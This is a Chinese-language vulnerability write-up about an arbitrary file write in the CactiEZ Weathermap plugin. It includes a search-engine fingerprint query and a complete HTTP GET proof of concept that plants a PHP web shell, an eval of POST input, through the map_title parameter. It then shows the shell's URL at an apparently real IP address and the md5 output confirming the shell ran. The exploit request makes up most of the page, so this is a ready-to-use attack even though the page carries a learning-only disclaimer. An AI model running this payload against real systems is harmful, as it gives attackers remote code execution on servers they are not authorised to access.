---
title: "CactiEZ weathermap 插件任意文件写入漏洞"
date: 2026-10-16 09:07:10
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "CactiEZ-weathermap"
tags:
  - "CactiEZ-weathermap"
  - "任意文件写入"
  - "漏洞复现"
---
## 漏洞描述

CactiEZ 中文版是 Cacti 中文解决方案，整合了 Spine，RRDTool 和美化字体。集成 Thold，Monitor，Syslog，Weathermap，Realtime，Errorimage，Mobile，Aggregate 以及 Apache，Squid，F5，Nginx，MySQL 等模板。

CactiEZ Weathermap 插件存在任意文件写入漏洞。

## 披露时间

```
wooyun-2016-0178509
```

## 漏洞影响

```
CactiEZ Weathermap 插件
```

## 网络测绘

```
app="Cactiez"
```

## 漏洞复现

登录页面

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/CactiEZ%20weathermap%20%E6%8F%92%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20240904155436553.png)

poc

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">GET /plugins/weathermap/editor.php?plug=0&amp;mapname=test.php&amp;action=set_map_properties&amp;param=&amp;param2=&amp;debug=existing&amp;node_name=&amp;node_x=&amp;node_y=&amp;node_new_name=&amp;node_label=&amp;node_infourl=&amp;node_hover=&amp;node_iconfilename=--NONE--&amp;link_name=&amp;link_bandwidth_in=&amp;link_bandwidth_out=&amp;link_target=&amp;link_width=&amp;link_infourl=&amp;link_hover=&amp;map_title=&lt;?php%20echo(md5(1));@&#101;val(&#36;_POST[0]);?&gt;&amp;map_legend=Traffic+Load&amp;map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&amp;map_linkdefaultwidth=7 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: */*
Cookie: Cacti=xxx</code></pre>

</details>

```
http://114.242.111.210:8088/plugins/weathermap/configs/test.php
```

回显 md5 值：

```
# echo(md5(1));
c4ca4238a0b923820dcc509a6f75849b
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/CactiEZ%20weathermap%20%E6%8F%92%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20240904154426936.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/CactiEZ-weathermap-%E6%8F%92%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
